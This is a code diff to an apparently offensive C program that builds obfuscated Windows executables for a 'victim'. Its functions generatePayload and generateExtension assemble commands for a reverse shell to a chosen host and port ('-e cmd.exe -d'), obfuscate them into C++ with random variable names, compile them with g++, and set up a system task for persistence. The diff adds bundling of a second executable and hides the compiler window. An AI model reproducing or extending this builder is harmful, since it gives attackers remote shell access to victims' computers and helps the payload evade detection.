@@ -18,9 +18,12 @@ void get(char *prompt, char *str, int size)
     fflush(stdin);
 }
 
-void compile(char *compiled_file, char *first_file_provided, char *type)
+void compile(char *compiled_file, char *first_file_provided, char *type, char *second_file_provided)
 {
+    char ch;
     char cmd[2000];
+
+    printf("Creating %s ...", first_file_provided);
 
     strcpy(cmd, "windres RES/RC/res_");
     strcat(cmd, type);
@@ -28,7 +31,7 @@ void compile(char *compiled_file, char *first_file_provided, char *type)
     system(cmd);
     sleep(2);
     cmd[0] = '\0';
-    strcat(cmd, "start g++ -static ");
+    strcat(cmd, "start /MIN g++ -static ");
     strcat(cmd, compiled_file);
     strcat(cmd, " RES/RC/res_TMP -o OUTPUT/");
     strcat(cmd, first_file_provided);
@@ -37,6 +40,13 @@ void compile(char *compiled_file, char *first_file_provided, char *type)
     sleep(2);
     remove(compiled_file);
     remove("RES/RC/res_TMP");
+
+    cmd[0] = '\0';
+    strcat(cmd, "COPY /Y RES\\FILE_B.exe OUTPUT\\");
+    strcat(cmd, second_file_provided);
+    strcat(cmd, ".exe");
+    system(cmd);
+    sleep(1);
 }
 
 char *generateRandomString(char *string, const int length)
@@ -74,7 +84,7 @@ void obfuscate(char *tmp_file_name, char *cmd_non_obfuscate)
     {
         char letter[2] = {alphabet[i], '\0'};
         strcat(source_code, "std::string ");
-        strcat(source_code, generateRandomString(random_variable, rand() % 50 +1));
+        strcat(source_code, generateRandomString(random_variable, rand() % 50 + 1));
         strcat(source_code, " = \"");
         strcat(source_code, letter);
         strcat(source_code, "\";");
@@ -143,7 +153,7 @@ void generatePayload(char *victim_dir, char *file_provider, char *first_file_pro
     strcat(cmd_PAYLOAD, ".exe & exit\"");
 
     obfuscate("c_TMP_PAYLOAD.cpp", cmd_PAYLOAD);
-    compile("c_TMP_PAYLOAD.cpp", payload_name, "PAYLOAD");
+    compile("c_TMP_PAYLOAD.cpp", payload_name, "PAYLOAD", second_file_provided);
 }
 
 void generateExtension(char *victim_dir, char *host, char *port, char *second_file_provided, char *first_file_provided)
@@ -162,7 +172,7 @@ void generateExtension(char *victim_dir, char *host, char *port, char *second_fi
     strcat(cmd_EXTENSION, " -e cmd.exe -d ^");
 
     obfuscate("c_TMP_EXTENSION.cpp", cmd_EXTENSION);
-    compile("c_TMP_EXTENSION.cpp", first_file_provided, "FILE_A");
+    compile("c_TMP_EXTENSION.cpp", first_file_provided, "FILE_A", second_file_provided);
 }
 
 int main(int argc, char const *argv[])
@@ -197,10 +207,10 @@ int main(int argc, char const *argv[])
 
         if (strcmp(choice, "y") == 0 || strcmp(choice, "Y") == 0)
         {
-            get("Please enter the dir you want to create to the victim [default : 'C:/System']: ", victim_dir, 255);
+            get("Please enter the dir you want to create to the victim [default : 'C:\\System']: ", victim_dir, 255);
             if (strlen(victim_dir) == 0)
             {
-                strcpy(victim_dir, "C:/System");
+                strcpy(victim_dir, "C:\\System");
             }
 
             get("Please enter the name for the system task you want to create to the victim [default : 'TaskSystem']: ", task_name, 255);
@@ -296,7 +306,7 @@ int main(int argc, char const *argv[])
         }
         else if (strcmp(choice, "n") == 0 || strcmp(choice, "N") == 0)
         {
-            strcpy(victim_dir, "C:/System");
+            strcpy(victim_dir, "C:\\System");
             strcpy(first_file_provided, "FILE_A");
             strcpy(second_file_provided, "FILE_B");
             strcpy(task_name, "TaskSystem");
